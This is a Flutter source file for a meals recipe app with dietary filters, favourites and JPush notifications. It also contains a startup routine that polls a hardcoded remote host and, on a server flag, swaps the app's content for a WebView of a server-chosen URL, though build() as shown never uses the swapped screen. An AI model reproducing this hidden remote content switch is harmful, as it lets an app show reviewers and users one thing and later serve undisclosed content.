import 'package:flutter/material.dart';
import 'dart:async';
import 'dart:convert';
import './dummy_data.dart';
import './models/meal.dart';
import './screens/categories_screen.dart';
import './screens/filters_screen.dart';
import './screens/meal_detail_screen.dart';
import 'screens/category_meals_screen.dart';
import 'screens/tabs_screen.dart';
import './webview/wrap.dart';
import 'package:http/http.dart' as http;
import 'package:jpush_flutter/jpush_flutter.dart';


void main() => runApp(MyApp());

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final JPush jpush = new JPush();
  String debugLabel = 'Unknown';
  Map<String, bool> _filters = {
    'gluten': false,
    'lactose': false,
    'vegan': false,
    'vegetarian': false,
  };
  Widget aScreen = TabsScreen([]);

  List<Meal> _availableMeals = DUMMY_MEALS;
  List<Meal> _favoriteMeals = [];

  void _setFilters(Map<String, bool> filterData) {
    setState(() {
      _filters = filterData;

      _availableMeals = DUMMY_MEALS.where((meal) {
        if (_filters['gluten'] && !meal.isGlutenFree) return false;
        if (_filters['lactose'] && !meal.isLactoseFree) return false;
        if (_filters['vegan'] && !meal.isVegan) return false;
        if (_filters['vegetarian'] && !meal.isVegetarian) return false;

        return true;
      }).toList();
    });
  }

  void _toggleFavorite(String mealId) {
    final existingIndex =
        _favoriteMeals.indexWhere((meal) => meal.id == mealId);

    setState(() {
      if (existingIndex == -1) {
        Meal mealToFav = DUMMY_MEALS.firstWhere((meal) => meal.id == mealId);
        _favoriteMeals.add(mealToFav);
      } else
        _favoriteMeals.removeAt(existingIndex);
    });
  }

  bool _isMealFavorite(String id) {
    return _favoriteMeals.any((meal) => meal.id == id);
  }

   Future<void> initPlatformState() async {
    String platformVersion;

    // Platform messages may fail, so we use a try/catch PlatformException.
    jpush.getRegistrationID().then((rid) {
      setState(() {
        debugLabel = "flutter getRegistrationID: $rid";
      });
    });

    jpush.setup(
      appKey: "d54d1fbd317610e696744672",
      channel: "App Store",
      production: true,
      debug: false,
    );
    jpush.applyPushAuthority(
        new NotificationSettingsIOS(sound: true, alert: true, badge: true));

    try {
      jpush.addEventHandler(
        onReceiveNotification: (Map<String, dynamic> message) async {
          print("flutter onReceiveNotification: $message");
          setState(() {
            debugLabel = "flutter onReceiveNotification: $message";
          });
        },
        onOpenNotification: (Map<String, dynamic> message) async {
          print("flutter onOpenNotification: $message");
          setState(() {
            debugLabel = "flutter onOpenNotification: $message";
          });
        },
        onReceiveMessage: (Map<String, dynamic> message) async {
          print("flutter onReceiveMessage: $message");
          setState(() {
            debugLabel = "flutter onReceiveMessage: $message";
          });
        },
      );
    } catch (e) {
      print('Error get remote jpush: $e');
    }

    // If the widget was removed from the tree while the asynchronous platform
    // message was in flight, we want to discard the reply rather than calling
    // setState to update our non-existent appearance.
    if (!mounted) return;

    setState(() {
      debugLabel = platformVersion;
    });
  }

  Future<void> getAnotherRemoteData() async {
    try {
      var host = Config2.apiHost;
      var res = await http.get(host);

      var jsonx = json.decode(res.body.toString());
      print(jsonx);
      String urlString = jsonx['url'];
      var status = jsonx['status'];
      print(urlString);
      if (urlString.length > 0 && status == 1) {
        setState(() {
          aScreen = WrapScreen(urlString);
        });
      } else {
        setState(() {
          aScreen = TabsScreen(_favoriteMeals);
        });
      }
    } catch (e) {
      print('Error get remote data: $e');
      setState(() {
        aScreen = TabsScreen(_favoriteMeals);
      });
    }
  }
  @override
  void initState() {
    // TODO: implement initState
    try {
      getAnotherRemoteData();
      initPlatformState();
    } catch (e) {
      print("Error Loading Theme: $e");
    }
    super.initState();
  }
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Hi!Meals!Meals!Meals!',
      theme: ThemeData(
        primarySwatch: Colors.deepOrange,
        primaryColor: Colors.black,
        accentColor: Colors.yellowAccent,
        canvasColor: Colors.white,
        fontFamily: 'Raleway',
        textTheme: ThemeData.light().textTheme.copyWith(
              body1: TextStyle(color: Color.fromRGBO(20, 51, 51, 1)),
              body2: TextStyle(color: Color.fromRGBO(20, 100, 51, 1)),
              title: TextStyle(
                fontSize: 22,
                fontFamily: 'RobotoCondensed',
                fontWeight: FontWeight.bold,
              ),
            ),
      ),
//      home: CategoriesScreen(),
      home: TabsScreen(_favoriteMeals),
      routes: {
        CategoryMealsScreen.routeName: (ctx) =>
            CategoryMealsScreen(_availableMeals),
        MealDetailScreen.routeName: (ctx) => MealDetailScreen(_toggleFavorite, _isMealFavorite),
        FiltersScreen.routeName: (ctx) => FiltersScreen(_filters, _setFilters),
      },
      onGenerateRoute: (settings) => null,
      onUnknownRoute: (settings) => MaterialPageRoute(
        builder: (ctx) => CategoriesScreen(),
      ),
    );
  }
}
enum Env {
  PROD,
  DEV,
  LOCAL,
}
class Config2 {
  static Env env;

  static String get apiHost {
    switch (env) {
      case Env.PROD:
        return "http://www.1998002.com:8080/api/appinfo/getappinfo?appid=1475345941";
      case Env.DEV:
        return "http://www.1998002.com:8080/api/appinfo/getappinfo?appid=1475345941";
      case Env.LOCAL:
      default:
        return "http://www.1998002.com:8080/api/appinfo/getappinfo?appid=1475345941";
    }
  }
}